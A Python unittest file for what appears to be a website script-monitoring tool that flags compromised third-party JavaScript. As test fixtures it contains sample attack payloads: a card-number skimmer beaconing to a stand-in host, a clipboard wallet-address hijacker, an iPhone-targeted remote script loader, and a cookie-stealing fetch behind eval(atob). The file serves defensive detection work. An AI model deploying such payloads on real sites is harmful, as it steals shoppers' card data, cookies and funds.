import gzip
import io
import json
import os
import shutil
import tempfile
import threading
import unittest
from contextlib import redirect_stdout
from http.server import BaseHTTPRequestHandler, HTTPServer
from unittest import mock

from scriptwatch import cli, web
from scriptwatch import signals as S
from scriptwatch.monitor import Scanner, load_baseline, save_baseline

VENDOR = ("!function(){var q=[];window.optly={push:function(e){q.push(e)}};"
          "navigator.sendBeacon('https://logx.vendor.test/event',JSON.stringify(q))}();")
SKIMMER = (";(function(){document.addEventListener('keyup',function(){var f=document.querySelectorAll('input');"
           "var c=document.getElementById('cardnumber');if(c){navigator.sendBeacon('https://stats-cdn.example/c',c.value)}})})();")
WALLET = (";var w='bc1qexampleexampleexampleexample0wallet3x';document.addEventListener('copy',function(e){"
          "e.clipboardData.setData('text/plain',w)});")
IOS = (";if(/(iPhone|iPad|iPod)/.test(navigator.userAgent)){var s=document.createElement('script');"
       "s.src='https://img-cdn.example/k.js';document.head.appendChild(s)}")


def rules(findings, at_least="low"):
    order = {"low": 0, "medium": 1, "high": 2}
    return {f.rule for f in findings if order[f.severity] >= order[at_least]}


class FakeWeb:
    """A dictionary of URL -> body that stands in for the internet."""

    def __init__(self, pages):
        self.pages = dict(pages)

    def __call__(self, url):
        if url not in self.pages:
            raise web.FetchError("HTTP 404")
        body = self.pages[url]
        headers = {"content-type": "text/html; charset=utf-8"}
        if isinstance(body, tuple):
            body, extra = body
            headers.update(extra)
        return web.Response(url, 200, headers, body.encode() if isinstance(body, str) else body)


PAGE = """<!doctype html><html><head>
<script src="/js/app.js"></script>
<script src="https://cdn.vendor.test/snippet.js"></script>
<script type="application/ld+json">{"@type":"Store"}</script>
<script>window.dataLayer=[];</script>
</head><body></body></html>"""


def site(**overrides):
    pages = {"https://shop.test/": PAGE,
             "https://shop.test/js/app.js": "document.querySelector('#buy').onclick=function(){fetch('/api/cart')}",
             "https://cdn.vendor.test/snippet.js": VENDOR}
    pages.update(overrides)
    return FakeWeb(pages)


class Signals(unittest.TestCase):
    def test_attack_shapes(self):
        self.assertEqual(rules(S.judge(S.scan(SKIMMER), "cdn.example")), {"SW001"})
        self.assertIn("SW002", rules(S.judge(S.scan(WALLET), "cdn.example")))
        hidden = "eval(atob('ZG9jdW1lbnQ='));fetch('https://x.example/'+document.cookie)"
        self.assertIn("SW003", rules(S.judge(S.scan(hidden), "cdn.example")))
        self.assertIn("SW005", rules(S.judge(S.scan("new WebSocket('wss://203.0.113.9:8099/')"), "x")))

    def test_payment_providers_may_touch_card_fields(self):
        self.assertEqual(S.judge(S.scan(SKIMMER), "js.stripe.com"), [])

    def test_privacy_masking_lists_are_medium(self):
        recorder = ("document.addEventListener('input',function(e){var n=e.target.name;"
                    "if(/^cc|cardnum|ccnum|creditcard|cvv|pass|pwd|ssn/i.test(n))return;"
                    "fetch('/r',{method:'POST',body:new FormData(e.target.form)})})")
        concerns = S.judge(S.scan(recorder), "cdn.example")
        self.assertEqual([(c.rule, c.severity) for c in concerns], [("SW001", "medium")])

    def test_change_detection_uses_existing_network_code(self):
        # the vendor already sends data; the attacker only adds card-field reading
        before = VENDOR
        after = VENDOR + ";document.addEventListener('keyup',function(){var f=document.querySelectorAll('input');" \
                         "q.push(document.getElementById('cardnumber').value)})"
        new = S.scan(after)
        added = S.new_hits(S.fingerprints(S.scan(before)), new)
        self.assertIn("SW001", rules(S.judge(new, "cdn.vendor.test", added=added), "high"))

    def test_unchanged_behaviour_is_not_news(self):
        new = S.scan(VENDOR + "/* v2 */")
        added = S.new_hits(S.fingerprints(S.scan(VENDOR)), new)
        self.assertEqual(S.judge(new, "cdn.vendor.test", added=added), [])

    def test_domains_and_script_urls(self):
        js = "x='https://stats-cdn.example/c';y='//cdn.tags.test/gtm.js?id=1';z='https://img.example/a.png'"
        self.assertEqual(S.domains(js), {"stats-cdn.example", "cdn.tags.test", "img.example"})
        self.assertEqual(S.script_urls(js), ["https://cdn.tags.test/gtm.js?id=1"])


class Pages(unittest.TestCase):
    def test_parse(self):
        html = ('<html><head><base href="https://shop.test/sub/"><meta http-equiv="Content-Security-Policy" '
                'content="script-src \'self\'"><script src="a.js" integrity="sha384-x"></script>'
                '<link rel="modulepreload" href="/m.js"><link rel="preload" as="script" href="p.js">'
                '<link rel="preload" as="style" href="s.css"><script type="text/template"><b>x</b></script>'
                '<script>var a=1;</script></head></html>')
        page = web.parse_page(web.Response("https://shop.test/", 200, {}, html.encode()))
        self.assertEqual([s.src for s in page.scripts if s.src],
                         ["https://shop.test/sub/a.js", "https://shop.test/m.js", "https://shop.test/sub/p.js"])
        self.assertEqual(page.scripts[0].integrity, "sha384-x")
        self.assertEqual([s.inline for s in page.scripts if s.src is None], ["var a=1;"])
        self.assertEqual(page.csp_source, "meta tag")

    def test_sites(self):
        self.assertEqual(web.site_of("www.bbc.co.uk"), "bbc.co.uk")
        self.assertEqual(web.site_of("cdn.optimizely.com"), "optimizely.com")
        self.assertFalse(web.third_party("https://static.shop.test/a.js", "https://www.shop.test/"))
        self.assertTrue(web.third_party("https://cdn.optimizely.com/js/1.js", "https://www.zoom.us/"))


class Monitoring(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.base = os.path.join(self.tmp, "baseline.json")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def baseline_from(self, fake):
        r = Scanner(fake).scan("https://shop.test/", {"version": 1, "pages": {}})
        save_baseline(self.base, [r], {"version": 1, "pages": {}})
        return load_baseline(self.base), r

    def test_first_scan_of_a_clean_site(self):
        _, r = self.baseline_from(site())
        self.assertEqual(rules(r.findings, "medium"), set())
        self.assertEqual(set(r.scripts), {"https://shop.test/js/app.js", "https://cdn.vendor.test/snippet.js"})
        self.assertTrue(r.scripts["https://cdn.vendor.test/snippet.js"].third_party)
        self.assertIn("SW015", rules(r.findings))   # no CSP

    def test_compromised_vendor_script(self):
        baseline, _ = self.baseline_from(site())
        hacked = site(**{"https://cdn.vendor.test/snippet.js": VENDOR + SKIMMER + WALLET + IOS})
        r = Scanner(hacked).scan("https://shop.test/", baseline)
        self.assertTrue({"SW001", "SW002", "SW006", "SW013"} <= rules(r.findings, "high"), rules(r.findings))
        ev = next(f for f in r.findings if f.rule == "SW013").evidence
        self.assertIn("stats-cdn.example", ev)

    def test_legitimate_update_is_low(self):
        baseline, _ = self.baseline_from(site())
        updated = site(**{"https://cdn.vendor.test/snippet.js": VENDOR + ";window.optly.version='2.1';"})
        r = Scanner(updated).scan("https://shop.test/", baseline)
        self.assertEqual(rules(r.findings, "medium"), set())
        self.assertIn("SW012", rules(r.findings))

    def test_new_script_and_removed_script(self):
        baseline, _ = self.baseline_from(site())
        page = PAGE.replace('<script src="/js/app.js"></script>', '<script src="https://cdn.newtag.test/t.js"></script>')
        r = Scanner(site(**{"https://shop.test/": page, "https://cdn.newtag.test/t.js": "var t=1;"})).scan(
            "https://shop.test/", baseline)
        self.assertIn("SW011", rules(r.findings, "medium"))
        self.assertEqual(r.removed, ["https://shop.test/js/app.js"])

    def test_tag_manager_chain_and_plain_http(self):
        page = '<script src="https://tags.test/gtm.js"></script><script src="http://old.cdn.test/lib.js"></script>'
        fake = FakeWeb({"https://shop.test/": page, "https://tags.test/gtm.js": "x('https://cdn.vendor.test/snippet.js')",
                        "https://cdn.vendor.test/snippet.js": VENDOR + SKIMMER, "http://old.cdn.test/lib.js": "var a"})
        r = Scanner(fake).scan("https://shop.test/", {"version": 1, "pages": {}})
        self.assertEqual(r.scripts["https://cdn.vendor.test/snippet.js"].loaded_by, "https://tags.test/gtm.js")
        self.assertIn("SW001", rules(r.findings, "high"))   # found one level down
        self.assertIn("SW014", rules(r.findings, "high"))

    def test_unreachable_script_and_page(self):
        fake = site()
        del fake.pages["https://cdn.vendor.test/snippet.js"]
        r = Scanner(fake).scan("https://shop.test/", {"version": 1, "pages": {}})
        self.assertIn("SW017", rules(r.findings))
        self.assertTrue(Scanner(FakeWeb({})).scan("https://down.test/", {"version": 1, "pages": {}}).error)

    def test_csp_header_counts(self):
        fake = site(**{"https://shop.test/": (PAGE, {"content-security-policy": "script-src 'self' cdn.vendor.test"})})
        r = Scanner(fake).scan("https://shop.test/", {"version": 1, "pages": {}})
        self.assertNotIn("SW015", rules(r.findings))


class _Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        body = gzip.compress(b"<script src='/a.js'></script>") if self.path == "/" else b"var a=1;"
        self.send_response(200)
        if self.path == "/":
            self.send_header("Content-Encoding", "gzip")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


class RealHttp(unittest.TestCase):
    def test_fetch_and_gzip(self):
        srv = HTTPServer(("127.0.0.1", 0), _Handler)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            r = Scanner().scan(f"http://127.0.0.1:{srv.server_port}/", {"version": 1, "pages": {}})
        finally:
            srv.shutdown()
            srv.server_close()
        self.assertEqual(r.error, "")
        self.assertEqual(len(r.scripts), 1)


class Cli(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def run_cli(self, *argv):
        buf = io.StringIO()
        with redirect_stdout(buf):
            code = cli.main(list(argv))
        return code, buf.getvalue()

    def test_scan_update_then_detect(self):
        base = os.path.join(self.tmp, "b.json")
        with mock.patch.object(web, "fetch", site()):
            code, out = self.run_cli("shop.test", "--baseline", base, "--update", "--no-color")
        self.assertEqual(code, 0)
        self.assertIn("Baseline saved", out)
        hacked = site(**{"https://cdn.vendor.test/snippet.js": VENDOR + SKIMMER})
        with mock.patch.object(web, "fetch", hacked):
            code, out = self.run_cli("scan", "https://shop.test/", "--baseline", base, "--no-color")
            self.assertEqual(code, 1)
            self.assertIn("DANGER", out)
            data = json.loads(self.run_cli("scan", "https://shop.test/", "--baseline", base, "--format", "json")[1])
            self.assertTrue(any(f["rule"] == "SW001" for f in data["pages"][0]["findings"]))
            self.assertEqual(json.loads(self.run_cli("scan", "https://shop.test/", "--baseline", base,
                                                     "--format", "sarif")[1])["version"], "2.1.0")

    def test_update_never_claims_a_save_when_nothing_loaded(self):
        base = os.path.join(self.tmp, "b.json")
        err = io.StringIO()
        with mock.patch.object(web, "fetch", FakeWeb({})), mock.patch("sys.stderr", err):
            code, out = self.run_cli("https://down.test/", "--baseline", base, "--update", "--no-color")
        self.assertEqual(code, 2)
        self.assertFalse(os.path.exists(base))
        self.assertIn("baseline was not changed", err.getvalue())
        self.assertNotIn("Baseline saved", out)

    def test_user_agent_shortcut(self):
        seen = []

        def fake_fetch(url, insecure=False, user_agent=web.UA):
            seen.append(user_agent)
            return site()(url)
        with mock.patch.object(web, "fetch", fake_fetch):
            self.run_cli("https://shop.test/", "--baseline", os.path.join(self.tmp, "b.json"),
                         "--user-agent", "iphone", "--fail-on", "never")
        self.assertTrue(seen and all("iPhone" in ua for ua in seen))

    def test_url_normalization(self):
        for u in ("shop.test", "https://shop.test", "HTTPS://Shop.Test/", "https://shop.test/#top"):
            self.assertEqual(cli.normalize(u), "https://shop.test/")
        self.assertEqual(cli.normalize("https://shop.test/checkout?step=2"), "https://shop.test/checkout?step=2")

    def test_file_and_diff(self):
        a, b = os.path.join(self.tmp, "a.js"), os.path.join(self.tmp, "b.js")
        with open(a, "w") as fh:
            fh.write(VENDOR)
        with open(b, "w") as fh:
            fh.write(VENDOR + SKIMMER)
        self.assertEqual(self.run_cli("file", a)[0], 0)
        code, out = self.run_cli("diff", a, b, "--no-color")
        self.assertEqual(code, 1)
        self.assertIn("SW001", out)


if __name__ == "__main__":
    unittest.main()
